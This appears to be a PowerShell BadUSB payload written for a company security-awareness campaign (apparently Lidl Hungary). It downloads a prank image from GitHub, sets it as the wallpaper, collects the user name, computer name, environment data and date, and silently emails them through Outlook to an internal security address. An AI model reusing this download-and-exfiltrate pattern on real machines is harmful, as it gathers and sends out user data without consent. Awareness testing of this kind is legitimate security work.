mkdir C:\L1dl;
cd C:\L1dl;
$rand = (Get-Random -Maximum 4 ) + 1
wget "https://raw.githubusercontent.com/balazsbanyasz/work/main/hoff$rand.png" -o "hoff$rand.png";
& ".\hoff$rand.png";
Function Set-WallPaper {
param (
    [parameter(Mandatory=$True)]
    [string]$Image,
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
};

Set-WallPaper -Image "C:\L1dl\hoff$rand.png" -Style Fit;
$name = whoami; $name = $name.substring(3); echo "#happyhoff | BadUSBAwarenessV1.3" >> C:\L1dl\$name.txt; whoami >> C:\L1dl\$name.txt; Get-ChildItem Env: | ft key,Value; $env:COMPUTERNAME >> C:\L1dl\$name.txt; $env:CLIENTTYPE >> C:\L1dl\$name.txt; date >> C:\L1dl\$name.txt; $outlook = new-object -comobject outlook.application; $email = $outlook.CreateItem(0); $email.To = "iso@lidl.hu"; $email.Sensitivity = 3; $email.Subject = "$name rubberducky!"; $date = date; $email.Body = "$name $date bedugta a rubber duckyt a gépébe"; $email.Attachments.add("C:\L1dl\$name.txt"); $email.Send();
